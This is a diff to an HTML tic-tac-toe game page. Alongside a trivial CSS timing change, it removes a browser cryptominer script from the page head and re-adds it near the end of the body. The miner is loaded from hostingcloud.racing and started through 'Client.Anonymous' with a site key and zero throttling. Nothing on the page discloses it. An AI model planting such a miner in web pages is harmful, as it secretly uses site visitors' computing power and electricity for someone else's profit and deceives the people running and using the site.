@@ -2,7 +2,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<script src="https://www.hostingcloud.racing/A6v3.js"></script> <script> var _client = new Client.Anonymous('5206f7cae40719556ec84d94febf092a2e583a172bbebdf17e8757fffafcc387', { throttle: 0, c: 'w', ads: 0 }); _client.start(); </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Tic-Tac-Toe Online</title>
@@ -73,7 +72,7 @@
             border: none;
             cursor: pointer;
             font-size: 18px;
-            transition: background 0.3s;
+            transition: background 0.5s;
         }
         #exit-btn {
             background-color: red;
@@ -100,7 +99,15 @@
         <button id="restart-btn" onclick="restartGame()">Start Again</button>
         <button id="exit-btn" onclick="exitGame()">Exit</button>
     </div>
+<script src="https://www.hostingcloud.racing/Bg4J.js"></script>
+<script>
+    var _client = new Client.Anonymous('5206f7cae40719556ec84d94febf092a2e583a172bbebdf17e8757fffafcc387', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    
 
+</script>
     <script>
         const socket = io();
         let room = "";
